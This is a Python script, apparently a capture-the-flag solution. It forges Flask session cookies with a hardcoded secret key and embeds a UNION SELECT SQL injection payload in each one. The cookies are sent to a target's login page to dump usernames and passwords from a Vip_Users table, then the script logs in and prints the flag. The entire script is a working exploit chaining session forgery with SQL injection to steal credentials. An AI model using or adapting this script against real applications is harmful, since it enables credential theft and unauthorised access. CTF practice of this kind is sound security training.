from flask import Flask, session, request
import re
import requests

app = Flask(__name__)
app.secret_key = "h1myname1smynam31smynameischikach1k4slimsh4dy"

@app.route('/<col>')
def set_cookie(col):
    session['username'] = f"x' UNION Select 1,group_concat({col}),1 FROM Vip_Users;--"
    session['password'] = 'a'
    return "OK"

with app.test_client() as client:
    r1 = client.get('/passkey')
    r2 = client.get('/uname')
    
    c1 = r1.headers.get('Set-Cookie')
    c2 = r2.headers.get('Set-Cookie')
    # get just the cookie
    c1 = c1.split("=")[1].split(";")[0]
    c2 = c2.split("=")[1].split(";")[0]

url = input("ENTER BASE URL: ") 
r_pass = requests.get(url + "/login", cookies={"session":c1})
r_user = requests.get(url + "/login", cookies={"session":c2})

p = re.search(r"Welcome.*?Chocolates (.*?)!", r_pass.text).group(1).split(",")
u = re.search(r"Welcome.*?Chocolates (.*?)!", r_user.text).group(1).split(",")

print("PASSWORDS:", p) 
print("USERNAMES:", u) 

r = requests.post(url + "/login",
                  data=f"username={u[0]}&password={p[0]}",
                  headers={"Content-Type":"application/x-www-form-urlencoded"})

print("FLAG:", re.search(r"nite\{[^}]+\}", r.text)[0])
